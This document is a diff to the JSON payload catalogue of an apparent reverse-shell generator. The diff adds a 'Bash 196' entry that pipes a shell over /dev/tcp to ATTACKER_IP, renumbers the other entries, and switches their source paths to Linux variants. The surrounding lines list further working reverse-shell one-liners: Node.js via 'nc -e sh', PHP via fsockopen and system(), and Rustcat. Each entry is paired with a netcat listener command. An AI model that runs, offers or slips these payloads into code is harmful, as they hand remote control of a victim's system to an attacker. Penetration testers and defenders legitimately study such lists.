@@ -18,8 +18,17 @@
       "path": ""
     },
     {
+      "name": "Bash 196",
+      "uniqueID": 3,
+      "description": "Bash 196 Reverse Shell",
+      "reverseShell": "0<&196;exec 196<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT; sh <&196 >&196 2>&196",
+      "listener": "nc -u -lvp ATTACKER_PORT",
+      "isFile": false,
+      "path": ""
+    },
+    {
         "name": "Node.js",
-        "uniqueID": 3,
+        "uniqueID": 4,
         "description": "Node.js Reverse Shell",
         "reverseShell": "require('child_process').exec('nc -e sh ATTACKER_IP ATTACKER_PORT')",
         "listener": "nc -u -lvp ATTACKER_PORT",
@@ -28,7 +37,7 @@
       },
       {
         "name": "PHP System",
-        "uniqueID": 4,
+        "uniqueID": 5,
         "description": "PHP System Reverse Shell",
         "reverseShell": "php -r '$sock=fsockopen('ATTACKER_IP',ATTACKER_PORT);system('sh <&3 >&3 2>&3');'",
         "listener": "nc -u -lvp ATTACKER_PORT",
@@ -37,7 +46,7 @@
       },
       {
         "name": "Rustcat",
-        "uniqueID": 5,
+        "uniqueID": 6,
         "description": "Rustcat Reverse Shell",
         "reverseShell": "rcat ATTACKER_IP ATTACKER_PORT -r sh",
         "listener": "nc -u -lvp ATTACKER_PORT",
@@ -46,42 +55,42 @@
       },
       {
         "name": "C",
-        "uniqueID": 6,
+        "uniqueID": 7,
         "description": "C Reverse Shell",
         "reverseShell": "",
         "listener": "nc -u -lvp ATTACKER_PORT",
         "isFile": true,
-        "path": "revShell/revShell.c",
+        "path": "revShell/revShellLinux.c",
         "extension":".c"
       },
       {
         "name": "C#",
-        "uniqueID": 7,
+        "uniqueID": 8,
         "description": "C# Reverse Shell",
         "reverseShell": "",
         "listener": "nc -u -lvp ATTACKER_PORT",
         "isFile": true,
-        "path": "revShell/revShell.cs",
+        "path": "revShell/revShellLinux.cs",
         "extension":".cs"
       },
       {
         "name": "JavaScript",
-        "uniqueID": 8,
+        "uniqueID": 9,
         "description": "JavaScript Reverse Shell",
         "reverseShell": "",
         "listener": "nc -u -lvp ATTACKER_PORT",
         "isFile": true,
-        "path": "revShell/revShell.js",
+        "path": "revShell/revShellLinux.js",
         "extension":".js"
       },
       {
         "name": "Haskell",
-        "uniqueID": 9,
+        "uniqueID": 10,
         "description": "Haskell Reverse Shell",
         "reverseShell": "",
         "listener": "nc -u -lvp ATTACKER_PORT",
         "isFile": true,
-        "path": "revShell/revShell.lhs",
+        "path": "revShell/revShellLinux.lhs",
         "extension":".lhs"
       }
   ]
